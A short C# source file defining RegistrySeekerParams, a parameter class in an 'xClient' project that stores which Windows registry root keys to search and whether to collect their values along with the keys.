using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using xClient.Enums;

namespace xClient.Core.Registry
{
    public class RegistrySeekerParams
    {
        public bool GatherKeyValues { get; private set; }

        public RegistryKey[] RootKeys { get; set; }

        public RegistrySeekerParams(RegistryKey[] registryKeys, RegistrySearchAction keyAnalyzeDepth)
        {
            this.RootKeys = registryKeys;
            this.searchValueTypes = keyAnalyzeDepth;
        }

        private RegistrySearchAction searchValueTypes
        {
            get
            {
                RegistrySearchAction action = RegistrySearchAction.Keys;

                if (GatherKeyValues)
                    action |= RegistrySearchAction.Values;

                return action;
            }
            set
            {
                GatherKeyValues = (value & RegistrySearchAction.Values) == RegistrySearchAction.Values;
            }
        }
    }
}